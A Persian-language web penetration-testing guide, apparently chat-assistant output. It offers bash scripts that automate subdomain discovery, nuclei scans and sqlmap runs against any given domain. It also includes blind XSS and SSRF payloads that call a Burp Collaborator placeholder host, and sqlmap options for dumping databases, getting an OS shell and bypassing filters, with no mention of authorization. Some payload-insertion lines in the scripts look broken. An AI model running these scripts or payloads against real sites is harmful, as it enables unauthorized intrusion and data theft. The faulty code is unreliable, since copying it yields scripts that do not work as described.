برای آسان‌تر و حرفه‌ای‌تر کردن فرایند تست نفوذ وب، می‌توانید از اسکریپت‌های پیشرفته‌تر و راهنمای گام‌به‌گام استفاده کنید که ترکیبی از ابزارهای قدرتمند مثل Burp Suite و SQLMap را در بر می‌گیرند. همچنین منابع آموزشی فارسی و ویدیویی معتبر به شما کمک می‌کنند سریع‌تر یاد بگیرید و تست‌ها را اجرا کنید.

1. نمونه اسکریپت پیشرفته برای اتوماتیک‌سازی تست نفوذ وب
```bash
#!/bin/bash

if [ -z "$1" ]; then
  echo "Usage: $0 target.com"
  exit 1
fi

target=$1

echo "[*] Discovering subdomains with subfinder..."
subfinder -d $target -silent | sort -u > subdomains.txt

echo "[*] Checking live domains with httpx..."
cat subdomains.txt | httpx -silent -threads 50 > live_domains.txt

echo "[*] Extracting URLs from Wayback Machine..."
cat live_domains.txt | waybackurls | sort -u > urls.txt

echo "[*] Running nuclei scan for vulnerabilities..."
cat urls.txt | nuclei -silent -t /path/to/nuclei-templates/ -o nuclei_results.txt

echo "[*] Running SQLMap on URLs with parameters..."
grep -E '\?.+=' urls.txt | while read url; do
  echo "[*] Testing SQL Injection on $url"
  sqlmap -u "$url" --batch --level=3 --risk=2 --threads=10 --random-agent --output-dir=./sqlmap_output
done

echo "[*] Scan completed. Check nuclei_results.txt and sqlmap_output for details."
```

این اسکریپت با ترکیب ابزارهای subfinder, httpx, waybackurls, nuclei و sqlmap، فرایند جمع‌آوری اطلاعات و اسکن آسیب‌پذیری‌ها را اتوماتیک می‌کند.

می‌توانید آن را با Burp Suite ترکیب کنید تا تست‌های دستی دقیق‌تر انجام دهید.

2. راهنمای گام‌به‌گام کار با بخش‌های کلیدی Burp Suite
Proxy: ترافیک مرورگر را رهگیری و تغییر دهید.

Repeater: درخواست‌ها را دستی تغییر داده و ارسال کنید (مناسب برای تست XSS، SQLi).

Intruder: حملات خودکار با پیلودهای مختلف (Brute Force، Fuzzing).

Scanner (نسخه Pro): اسکن خودکار آسیب‌پذیری‌های رایج.

Extender: افزودن افزونه‌های کاربردی از Burp App Store.

Collaborator: تست‌های پیشرفته Out-of-Band (OOB).

نکته:
برای شروع، روی Proxy و Repeater تمرکز کنید و پس از تسلط، از Intruder و Scanner استفاده کنید.

3. نکات مهم برای استفاده حرفه‌ای از SQLMap
تست SQL Injection روی پارامترهای GET و POST

استفاده از گزینه‌های --batch, --level, --risk برای تنظیم شدت تست

استخراج دیتابیس، جداول، ستون‌ها و داده‌ها

اجرای دستورات سیستم عامل در صورت امکان

استفاده از فایل‌های پیلود سفارشی برای تست‌های خاص

4. منابع آموزشی فارسی و ویدیویی برای یادگیری سریع‌تر
دوره آموزش تست نفوذ وب (وب هکینگ) در لرن فایلز

ویدیو آموزش Burp Suite در آپارات

مقاله و آموزش SQLMap در pentestcore.com

مقاله معرفی و آموزش Burp Suite در سایفکس

5. پیشنهاد برای تسریع فرایند تست نفوذ
ابتدا با اسکریپت اتوماتیک بالا، اطلاعات و آسیب‌پذیری‌های اولیه را جمع‌آوری کنید.

سپس با Burp Suite تست‌های دستی و دقیق‌تر را انجام دهید.

در نهایت با SQLMap روی پارامترهای مشکوک SQLi کار کنید.

از افزونه‌های Burp Suite برای تست‌های خاص بهره ببرید.

همیشه گزارش دقیق و مستند تهیه کنید.


=================================================================================================

برای شما یک راهنمای جامع و نمونه اسکریپت‌های تخصصی‌تر برای تست آسیب‌پذیری‌های خاص مثل XSS، SSRF، CSRF و همچنین راهنمای گام‌به‌گام استفاده از بخش‌های پیشرفته Burp Suite و SQLMap آماده کرده‌ام که فرایند تست نفوذ را بسیار آسان‌تر و حرفه‌ای‌تر می‌کند.

1. اسکریپت تخصصی برای تست XSS با Burp Suite و Burp Collaborator
نمونه پیلود XSS با Burp Collaborator (Blind XSS)
xml
<script src="https://your-collaborator-id.burpcollaborator.net"></script>
این پیلود را در ورودی‌های مختلف سایت تزریق کنید (فرم‌ها، هدرها، کوکی‌ها).

اگر سرور به Burp Collaborator درخواست ارسال کند، یعنی آسیب‌پذیری Blind XSS وجود دارد.

در Burp Suite از منوی Burp Collaborator client، لاگ‌های دریافت شده را مشاهده کنید.

اتومیشن حمله XSS با Burp Suite Intruder
درخواست را در Proxy رهگیری کنید.

آن را به Intruder ارسال کنید.

پارامتر هدف را انتخاب و Payloadها را با انواع پیلودهای XSS (مثل <script>alert(1)</script>) پر کنید.

حمله را اجرا و پاسخ‌ها را تحلیل کنید.

2. اسکریپت نمونه برای تست SSRF (Blind SSRF با استفاده از Burp Collaborator)
bash
# نمونه payload برای تزریق SSRF
http://your-target.com/api?url=http://your-collaborator-id.burpcollaborator.net
پارامترهای URL یا هر ورودی که سرور درخواست HTTP ارسال می‌کند را هدف قرار دهید.

اگر سرور به دامنه Burp Collaborator درخواست ارسال کند، SSRF تایید می‌شود.

3. تست CSRF با Burp Suite
گام‌های تست CSRF
درخواست POST حساس (مثلاً تغییر رمز عبور) را در Burp Proxy رهگیری کنید.

درخواست را به Repeater ارسال کنید.

هدر Origin یا Referer را حذف یا تغییر دهید.

درخواست را ارسال کنید و بررسی کنید که آیا سرور درخواست بدون این هدرها را قبول می‌کند یا خیر.

اگر بدون اعتبارسنجی CSRF قبول شد، آسیب‌پذیری وجود دارد.

اتوماسیون تست CSRF با Burp Intruder
پارامترهای توکن CSRF را حذف یا تغییر دهید.

واکنش سرور را بررسی کنید.

4. راهنمای گام‌به‌گام استفاده پیشرفته از Burp Suite
Proxy: رهگیری و ویرایش درخواست‌ها

Repeater: تست دستی و تغییر پارامترها

Intruder: حملات خودکار با پیلودهای سفارشی

Scanner (نسخه Pro): اسکن خودکار آسیب‌پذیری‌ها

Collaborator: کشف آسیب‌پذیری‌های Out-of-Band مثل Blind XSS و SSRF

Extender: افزودن افزونه‌های تخصصی برای تست‌های خاص

Sequencer: تحلیل امنیت توکن‌ها و نشست‌ها

Comparer: مقایسه درخواست‌ها و پاسخ‌ها برای تحلیل دقیق‌تر

5. راهنمای استفاده پیشرفته SQLMap
تست SQL Injection روی پارامترهای GET و POST

استفاده از گزینه‌های پیشرفته:

--level=5 و --risk=3 برای تست عمیق‌تر

--technique=BEUSTQ برای انتخاب تکنیک‌های خاص

--dump برای استخراج داده‌ها

--os-shell یا --os-pwn برای بهره‌برداری از سیستم عامل

استفاده از فایل‌های پیلود سفارشی با --tamper برای دورزدن فیلترها

اجرای تست روی چندین URL به صورت خودکار با اسکریپت Bash

6. نمونه اسکریپت Bash برای اتوماتیک‌سازی تست XSS، SSRF و CSRF با Burp Suite و SQLMap
```bash
#!/bin/bash

target=$1
collaborator="your-collaborator-id.burpcollaborator.net"

if [ -z "$target" ]; then
  echo "Usage: $0 target.com"
  exit 1
fi

echo "[*] Starting subdomain enumeration..."
subfinder -d $target -silent > subdomains.txt

echo "[*] Checking live hosts..."
cat subdomains.txt | httpx -silent > live_hosts.txt

echo "[*] Extracting URLs for testing..."
cat live_hosts.txt | waybackurls | sort -u > urls.txt

echo "[*] Injecting XSS payloads with Collaborator..."
while read url; do
  if [[ "$url" == *"="* ]]; then
    xss_payload="<script src='https://$collaborator'></script>"
    test_url="${url/$url#*=/$xss_payload}"
    echo "Testing $test_url"
    curl -s "$test_url" > /dev/null
  fi
done < urls.txt

echo "[*] Testing SSRF with Collaborator..."
ssrf_payload="http://$collaborator"
# نمونه تست روی پارامترهای URL که شامل url یا redirect هستند
grep -E 'url=|redirect=' urls.txt | while read url; do
  test_url="${url/=(*)/=$ssrf_payload}"
  curl -s "$test_url" > /dev/null
done

echo "[*] Running SQLMap on URLs with parameters..."
grep -E '\?.+=' urls.txt | while read url; do
  echo "Running sqlmap on $url"
  sqlmap -u "$url" --batch --level=3 --risk=2 --threads=10 --random-agent --output-dir=./sqlmap_output
done

echo "[*] Manual CSRF testing recommended with Burp Suite Repeater and Intruder."
```
7. منابع آموزشی فارسی و ویدیویی معتبر
معرفی جامع Burp Suite و آموزش استفاده از ماژول‌های مختلف:
امنافزار رایکا - آموزش Burp Suite

آموزش اتوماسیون حملات XSS با Burp Suite:
ویرگول - آموزش XSS با Burp Suite

آموزش کامل SQLMap و تست SQL Injection:
PentestCore - آموزش SQLMap

دوره ویدیویی جامع Burp Suite:
LearnFiles - آموزش Burp Suite

